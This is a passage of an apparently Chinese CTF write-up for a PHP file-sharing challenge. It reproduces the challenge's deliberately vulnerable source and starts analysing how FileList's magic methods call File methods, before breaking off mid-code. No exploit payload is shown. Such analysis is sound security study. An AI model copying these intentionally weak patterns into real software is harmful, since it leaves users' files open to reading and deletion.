invoke__">execute</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify_user</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">user_exist</span>(<span class="hljs-variable">$username</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$password</span> . <span class="hljs-string">&quot;SiAchGHmFx&quot;</span>);<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-variable">$username</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_result</span>(<span class="hljs-variable">$expect</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$expect</span>) &amp;&amp; <span class="hljs-variable">$expect</span> === <span class="hljs-variable">$password</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$results</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$funcs</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;files = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$filenames</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$path</span>);<br><br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$filenames</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span>) &#123;<br>            <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br>            <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$path</span> . <span class="hljs-variable">$filename</span>);<br>            <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;files, <span class="hljs-variable">$file</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()] = <span class="hljs-keyword">array</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$func</span>) . <span class="hljs-string">&#x27;&lt;/th&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;results <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span> =&gt; <span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>            &#125;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$table</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">size</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        <span class="hljs-variable">$units</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27; B&#x27;</span>, <span class="hljs-string">&#x27; KB&#x27;</span>, <span class="hljs-string">&#x27; MB&#x27;</span>, <span class="hljs-string">&#x27; GB&#x27;</span>, <span class="hljs-string">&#x27; TB&#x27;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$size</span> &gt;= <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">4</span>; <span class="hljs-variable">$i</span>++) <span class="hljs-variable">$size</span> /= <span class="hljs-number">1024</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$size</span>, <span class="hljs-number">2</span>).<span class="hljs-variable">$units</span>[<span class="hljs-variable">$i</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detele</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileList</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">Name</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">Size</span>();<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//download.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;open_basedir&quot;</span>, <span class="hljs-title function_ invoke__">getcwd</span>() . <span class="hljs-string">&quot;:/etc:/tmp&quot;</span>);<br><br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br><span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;flag&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<span class="hljs-comment">//注意这里我们无法让文件名中包含flag</span><br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/octet-stream&quot;</span>);<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File not exist&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//delate.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br><span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>    <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">detele</span>();<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>    <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>    <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;File not exist&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>网盘管理界面是<code>index.php</code>，我们从该文件开始看：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileList</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">Name</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">Size</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>new</code>了一个<code>FileList</code>类，我们跟踪到该类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//class.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$results</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$funcs</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;files = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$filenames</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$path</span>);<br><br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$filenames</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span>) &#123;<br>            <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br>            <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$path</span> . <span class="hljs-variable">$filename</span>);<br>            <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;files, <span class="hljs-variable">$file</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()] = <span class="hljs-keyword">array</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$func</span>) . <span class="hljs-string">&#x27;&lt;/th&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;results <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span> =&gt; <span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>            &#125;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$table</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>吗的看的头都大了。。</p><p><code>__call</code>弄了个多维数组出来：<code>results[$file-&gt;name()][$func]</code>，即<code>results[文件名][函数名]=[调用结果]</code>。</p><p>遍历files数组，对每一个file变量执行一次$func，然后将结果存进$results多维数组，接下来的<code>_destruct</code>函数会将<code>FileList</code>对象的funcs变量和results数组中的内容以HTML表格的形式输出在index.php上（我们可以知道，index.php里创建了一个FileList对象，在脚本执行完毕后触发<code>_destruct</code>）。</p><p><code>__destruct()</code>就是把上面的多维数组遍历然后输出。</p><p><code>new</code>了一个<code>File</code>类，我们跟踪到该类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">size</span>(<span class="hljs-params"></span>) 